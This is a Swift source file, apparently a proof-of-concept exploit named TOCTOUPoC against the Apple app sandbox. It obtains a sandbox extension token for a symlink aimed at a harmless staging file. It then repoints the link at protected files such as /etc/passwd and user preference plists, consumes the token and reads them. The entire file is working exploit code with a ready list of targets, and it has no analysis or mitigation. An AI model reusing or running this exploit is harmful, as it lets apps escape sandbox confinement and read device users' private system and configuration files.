import Foundation

typealias FnIssue   = @convention(c) (UnsafePointer<CChar>?, UnsafePointer<CChar>?, UInt64) -> UnsafeMutablePointer<CChar>?
typealias FnConsume = @convention(c) (UnsafePointer<CChar>?) -> Int64
typealias FnRelease = @convention(c) (Int64) -> Void

private let RTLD_DEFAULT = UnsafeMutableRawPointer(bitPattern: -2)

struct ReadResult {
    let path: String
    let bytes: Int
    let preview: String
    let success: Bool
    let error: String?
}

enum TOCTOUPoC {

    static let defaultTargets: [String] = [
        "/etc/passwd",
        "/etc/group",
        "/etc/hosts",
        "/etc/protocols",
        "/etc/services",
        "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
        "/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist",
        "/var/preferences/com.apple.networkd.plist"
    ]

    private static func loadSymbols() -> (FnIssue, FnConsume, FnRelease)? {
        guard let sIssue   = dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file"),
              let sConsume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume"),
              let sRelease = dlsym(RTLD_DEFAULT, "sandbox_extension_release")
        else { return nil }
        return (unsafeBitCast(sIssue,   to: FnIssue.self),
                unsafeBitCast(sConsume, to: FnConsume.self),
                unsafeBitCast(sRelease, to: FnRelease.self))
    }

    static func read(targetPath: String,
                     workDir: URL,
                     onLog: @escaping (String) -> Void) -> ReadResult {

        guard let (issue, consume, release) = loadSymbols() else {
            onLog("[-] sandbox_extension symbols NOT found")
            return ReadResult(path: targetPath, bytes: 0, preview: "",
                              success: false, error: "symbols missing")
        }

        let stagePath = workDir.appendingPathComponent("s")
        let linkPath  = workDir.appendingPathComponent("l")
        let stageC = stagePath.path
        let linkC  = linkPath.path
        let targetC = targetPath

        let fm = FileManager.default

        // ── step 1: seed staging file (accessible) ──
        fm.createFile(atPath: stageC, contents: Data("x".utf8))

        // ── step 2: l -> s (BENIGN). issue token while pointed at benign. ──
        unlink(linkC)
        guard symlink(stageC, linkC) == 0 else {
            onLog("[-] symlink(l→s) errno=\(errno)")
            return ReadResult(path: targetPath, bytes: 0, preview: "",
                              success: false, error: "symlink stage errno \(errno)")
        }
        onLog("[*] l → s (staging)")

        let cls = strdup("com.apple.app-sandbox.read")!
        defer { free(cls) }

        let tokenPtr: UnsafeMutablePointer<CChar>? = linkC.withCString { lp in
            issue(cls, lp, 0)
        }
        guard let token = tokenPtr else {
            onLog("[-] issue_file → NULL errno=\(errno) (class denied?)")
            unlink(linkC); unlink(stageC)
            return ReadResult(path: targetPath, bytes: 0, preview: "",
                              success: false, error: "issue NULL errno \(errno)")
        }
        onLog("[*] token acquired")

        // ── step 3: TOCTOU swap — l -> p (ATTACK) ──
        unlink(linkC)
        guard symlink(targetC, linkC) == 0 else {
            onLog("[-] swap symlink errno=\(errno)")
            free(token); unlink(linkC); unlink(stageC)
            return ReadResult(path: targetPath, bytes: 0, preview: "",
                              success: false, error: "swap symlink errno \(errno)")
        }
        onLog("[*] l → p (attack) SWAPPED")

        // ── step 4: consume — kernel now authorizes based on current l ──
        let handle = consume(token)
        free(token)
        onLog("[*] consume handle=\(handle)")

        // ── step 5: read via l (currently → p) ──
        var result: ReadResult
        do {
            let data = try Data(contentsOf: URL(fileURLWithPath: linkC))
            if data.isEmpty {
                result = ReadResult(path: targetPath, bytes: 0, preview: "",
                                    success: false, error: "empty")
                onLog("[-] \(targetPath): empty")
            } else {
                let head = data.prefix(100)
                let preview = String(data: head, encoding: .utf8)?
                    .replacingOccurrences(of: "\n", with: "\\n") ?? "(binary)"
                result = ReadResult(path: targetPath, bytes: data.count,
                                    preview: preview, success: true, error: nil)
                onLog("[+] \(targetPath) — \(data.count)B — \(preview)")
            }
        } catch {
            result = ReadResult(path: targetPath, bytes: 0, preview: "",
                                success: false, error: error.localizedDescription)
            onLog("[-] \(targetPath): \(error.localizedDescription)")
        }

        if handle > 0 { release(handle) }
        unlink(linkC); unlink(stageC)
        return result
    }

    /// Diagnostic — try a direct read first (should fail), then the exploit path.
    static func diagnose(targetPath: String,
                         workDir: URL,
                         onLog: @escaping (String) -> Void) {
        onLog("── DIAG \(targetPath) ──")
        do {
            let d = try Data(contentsOf: URL(fileURLWithPath: targetPath))
            onLog("[!] direct read OK (\(d.count)B) — sandbox NOT blocking")
        } catch {
            onLog("[*] direct read denied (expected): \(error.localizedDescription)")
        }
        _ = read(targetPath: targetPath, workDir: workDir, onLog: onLog)
    }

    static func runAll(onLog: @escaping (String) -> Void,
                       onResult: @escaping (ReadResult) -> Void) {
        let workDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("toctou", isDirectory: true)
        try? FileManager.default.createDirectory(at: workDir, withIntermediateDirectories: true)

        onLog("[*] sandbox_extension TOCTOU starting")
        for p in defaultTargets {
            let r = read(targetPath: p, workDir: workDir, onLog: onLog)
            onResult(r)
        }
        onLog("[*] done")
    }
}